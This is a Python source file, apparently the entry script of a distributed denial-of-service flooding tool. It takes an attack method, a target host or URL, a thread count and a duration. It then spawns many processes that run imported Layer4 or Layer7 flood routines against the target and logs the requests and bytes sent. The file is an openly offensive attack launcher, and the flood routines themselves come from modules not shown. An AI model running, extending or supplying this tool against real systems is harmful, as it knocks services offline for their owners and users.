#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from json import loads
from multiprocessing import Event, Process
from socket import AF_INET, SOCK_DGRAM, socket
from sys import argv, exit as sys_exit
from contextlib import suppress
from time import sleep, time
from typing import List

from yarl import URL

from attacks.layer4 import Layer4
from attacks.layer7 import Layer7
from attacks.utils import (BYTES_SEND, REQUESTS_SENT, Tools, ToolsConsole,
                           ProxyManager, bcolors, exit as util_exit, logger)


def main() -> None:
    # Initializing...
    __ip__ = socket(AF_INET, SOCK_DGRAM)
    __ip__.connect(("8.8.8.8", 80))
    __ip__ = __ip__.getsockname()[0]

    #region ARGS
    try:
        if len(argv) < 2 or argv[1] == "--help":
            print(f"Usage: {argv[0]} <method> <target> <threads> <duration> [options]\
" \
                  f"Example: {argv[0]} TCP 1.1.1.1:80 100 60\
" \
                  f"Methods: " + ", ".join(sorted(list(Layer4.METHODS | Layer7.METHODS))) + "\
" \
                  f"Tools: " + ", ".join(sorted(list(ToolsConsole.METHODS))))
            sys_exit(0)

        if argv[1].upper() in ToolsConsole.METHODS:
            ToolsConsole.runConsole()
            sys_exit(0)

        method: str = argv[1].upper()
        target_str: str = argv[2]
        threads: int = int(argv[3])
        duration: int = int(argv[4])

    except IndexError:
        print(f"Usage: {argv[0]} <method> <target> <threads> <duration> [options]")
        sys_exit(0)
    except Exception as e:
        logger.error(e)
        sys_exit(1)


    if method not in (Layer4.METHODS | Layer7.METHODS):
        util_exit(f"Invalid method: {method}")

    if method in Layer4.METHODS and not ToolsConsole.checkRawSocket():
        util_exit("Layer4 attacks require root privileges.")

    target_l4 = None
    target_l7 = None
    host = None
    port = None
    if method in Layer7.METHODS:
        if not target_str.startswith("http"):
            target_str = "http://" + target_str
        try:
            target_l7 = URL(target_str)
            host = target_l7.host
            port = target_l7.port or (443 if target_l7.scheme == 'https' else 80)
        except Exception:
            util_exit(f"Invalid URL for Layer7 attack: {target_str}")
    else:
        if ":" in target_str:
            host, port_str = target_str.split(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                util_exit(f"Invalid port: {port_str}")
        else:
            host = target_str
            port = 80
        target_l4 = (host, port)


    with open("config.json") as f:
        config = loads(f.read())

    #endregion

    #region ATTACK
    logger.info(f"Starting attack on {bcolors.OKCYAN}{host}:{port}{bcolors.RESET} with {bcolors.OKCYAN}{threads}{bcolors.RESET} threads for {bcolors.OKCYAN}{duration}{bcolors.RESET} seconds.")
    logger.info(f"Method: {bcolors.OKCYAN}{method}{bcolors.RESET}")

    events: List[Event] = [Event() for _ in range(threads)]

    processes: List[Process] = []
    for i in range(threads):
        if method in Layer7.METHODS:
            p = Process(target=Layer7(target_l7, method, duration, events[i], config, __ip__).run, daemon=True)
        else:
            p = Process(target=Layer4(target_l4, method, duration, events[i], config, __ip__).run, daemon=True)
        processes.append(p)
        p.start()

    #endregion

    #region STATS
    try:
        start_time = time()
        while time() - start_time < duration:
            for event in events:
                event.set()
            sleep(1)
            logger.info(f"Requests: {bcolors.OKCYAN}{Tools.humanformat(int(REQUESTS_SENT))}{bcolors.RESET} | Bytes: {bcolors.OKCYAN}{Tools.humanbytes(int(BYTES_SEND))}{bcolors.RESET}")

    except KeyboardInterrupt:
        logger.info("Attack stopped by user.")

    finally:
        for event in events:
            event.clear()
        for p in processes:
            with suppress(Exception):
                p.terminate()
        logger.info("Attack finished.")
        sys_exit(0)

    #endregion

if __name__ == '__main__':
    main()
